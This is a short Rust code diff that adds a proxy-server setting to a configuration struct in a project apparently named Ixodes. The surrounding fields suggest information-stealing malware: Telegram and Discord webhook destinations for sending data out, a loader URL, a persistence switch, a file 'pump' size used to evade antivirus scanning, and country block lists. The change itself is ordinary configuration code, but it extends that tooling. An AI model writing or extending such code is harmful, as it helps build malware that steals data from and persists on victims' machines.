@@ -31,6 +31,7 @@ pub struct RecoveryControl {
     telegram_chat_id: Option<String>,
     discord_webhook: Option<String>,
     loader_url: Option<String>,
+    proxy_server: Option<String>,
     persistence_enabled: bool,
     #[allow(dead_code)]
     pump_size_mb: u32,
@@ -155,6 +156,10 @@ impl RecoveryControl {
         self.loader_url.as_deref()
     }
 
+    pub fn proxy_server(&self) -> Option<&str> {
+        self.proxy_server.as_deref()
+    }
+
     fn from_env() -> Self {
         let allowed_categories = env::var("IXODES_ENABLED_CATEGORIES")
             .ok()
@@ -252,6 +257,10 @@ impl RecoveryControl {
             .ok()
             .or_else(|| DEFAULT_LOADER_URL.map(String::from));
 
+        let proxy_server = env::var("IXODES_PROXY_SERVER")
+            .ok()
+            .or_else(|| DEFAULT_PROXY_SERVER.map(String::from));
+
         RecoveryControl {
             allowed_categories,
             artifact_key,
@@ -275,6 +284,7 @@ impl RecoveryControl {
             telegram_chat_id,
             discord_webhook,
             loader_url,
+            proxy_server,
             persistence_enabled,
             pump_size_mb,
             blocked_countries,
